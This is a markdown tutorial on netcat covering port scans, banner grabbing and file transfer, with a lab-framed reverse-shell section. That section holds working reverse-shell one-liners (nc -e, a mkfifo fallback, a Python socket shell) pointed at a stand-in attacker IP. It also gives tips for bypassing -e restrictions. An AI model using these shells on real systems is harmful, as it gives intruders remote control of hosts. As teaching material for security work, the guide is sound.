# 🧠 Netcat (`nc`) – Network Diagnostics & Reverse Shell Guide

> **Category**: Network Diagnostics, Pentesting, Ethical Hacking  
> **Skill Level**: Beginner to Advanced  
> **Use With**: Private labs, test networks, internal hosts  
> **Tool Type**: CLI  
> **Purpose**: Connectivity tests, port scans, banner grabs, file transfer, reverse shells

---

## 📘 What is Netcat?

Netcat is a powerful, low-level network utility that lets you send/receive raw data over TCP or UDP.

Often called the **"Swiss Army Knife of networking"**, Netcat is used to:

- 🔍 Scan for open ports
- 🎯 Test TCP/UDP services
- 🕵️ Grab banners to identify services
- 📁 Transfer files
- 📞 Establish reverse or bind shells (for ethical lab testing only)

---

## 🔧 Installation (Kali/Linux)

Netcat usually comes pre-installed. To verify:

```bash
which nc
```

If not installed:

```bash
sudo apt update && sudo apt install netcat -y
```

---

## 🛠️ Core Usage Examples

---

### ✅ Port Scanning (TCP)

```bash
nc -zv 10.10.10.1 1-1000
```

- `-z`: zero-I/O mode (just check ports)
- `-v`: verbose output

---

### ✅ Test TCP Connection to a Port

```bash
nc -v 10.10.10.1 80
```

Confirms if service is reachable.

---

### ✅ Banner Grabbing (Optional if service responds)

```bash
nc 10.10.10.1 80
```

Then type:

```http
GET / HTTP/1.1
Host: test.local
Connection: close

```

You might see:

```
HTTP/1.1 200 OK
Server: Apache/2.4.29 (Ubuntu)
```

If no output, it means the server is hardened (no info disclosure).

---

### ✅ File Transfer (One way)

**On receiver:**

```bash
nc -lvp 4444 > received.txt
```

**On sender:**

```bash
nc 10.10.10.5 4444 < file.txt
```

---

## 🧠 Reverse Shells (Ethical Hacking Use Only)

### ⚠️ What is a Reverse Shell?

A **reverse shell** is when a target machine (victim) **connects back** to your machine (attacker) and gives you shell access.

| Shell Type     | Who Initiates | Direction           |
|----------------|---------------|---------------------|
| Bind Shell     | Attacker      | Connects to victim  |
| Reverse Shell  | Victim        | Connects to attacker |

Used in:
- CTFs
- Red team engagements
- Lab exploitation scenarios

---

### ⚠️ Legal Warning

⚠️ Reverse shells are **extremely dangerous** and should **ONLY** be tested in **legal, safe labs** with permission.

---

## ⚙️ Netcat Reverse Shell Setup (LAB ONLY)

---

### 🔁 Step 1: Setup Listener (Attacker)

```bash
nc -lvp 4444
```

- `-l`: listen mode
- `-v`: verbose
- `-p 4444`: port number (customizable)

---

### 🔁 Step 2: Victim Sends Shell Back

On the **victim machine**, run:

```bash
nc <attacker-ip> 4444 -e /bin/bash
```

Or on Windows:

```powershell
nc.exe <attacker-ip> 4444 -e cmd.exe
```

**Note**: Some modern systems block `-e` option — alternatives include using named pipes or other payloads via Metasploit.

---

### 🔁 Output (Attacker's Terminal)

You now get access like:

```bash
whoami
root
uname -a
Linux target 5.10.0-23-kali x86_64 ...
```

You’re now **inside the target’s shell**.

---

## 🚫 Bypassing `-e` Restrictions (Advanced)

If the system blocks `-e`, you can:

**Linux Bash Fallback:**

```bash
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc <attacker-ip> 4444 > /tmp/f
```

**Python Reverse Shell:**

```bash
python3 -c 'import socket,subprocess,os;
s=socket.socket(); s.connect(("attacker-ip",4444));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
subprocess.call(["/bin/bash","-i"])'
```

---

## 🔒 How to Stay Ethical

| Rule                         | Description                             |
|------------------------------|-----------------------------------------|
| 🔐 Only in private labs      | Never try on real devices or public IPs |
| 🧪 Use CTF platforms         | TryHackMe, Hack The Box, VulnHub         |
| ⚠️ Ask for permission        | Never test networks you don’t own        |
| 📸 Document responsibly       | Mask IPs, usernames, passwords           |

---

## 🧪 Network Diagnostics Workflow (Use in Internship)

1. Scan open ports:
   ```bash
   nc -zv 10.10.10.1 1-1000
   ```

2. Test connection:
   ```bash
   nc -v 10.10.10.1 80
   ```

3. Try banner grabbing:
   ```bash
   GET / HTTP/1.1
   Host: test.local
   ```

4. (Lab) Set up listener for reverse shell:
   ```bash
   nc -lvp 4444
   ```

5. (Lab) Launch shell from target:
   ```bash
   nc <attacker-ip> 4444 -e /bin/bash
   ```

---

## ✅ Summary

| Command                              | Purpose                     |
|--------------------------------------|-----------------------------|
| `nc -zv <ip> 1-1000`                 | Scan ports                  |
| `nc -v <ip> <port>`                  | Test service availability   |
| `GET / HTTP/1.1` via `nc`            | Banner grab (if allowed)    |
| `nc -lvp 4444` + `-e /bin/bash`      | Reverse shell (lab only)    |
| `nc -lvp 4444 > file.txt`            | File receiver               |
| `nc <ip> 4444 < file.txt`            | File sender                 |

---

## 🧠 Final Tip

Netcat is simple but powerful. It teaches you **how networking works under the hood**. Use it for good, in labs, and document wisely.

---

Made with 💻 by Abin Shaji Thomas & 🐉 Kali GPT  
Tool repo: [CyberBible](https://github.com/YOUR-PRIVATE-REPO)
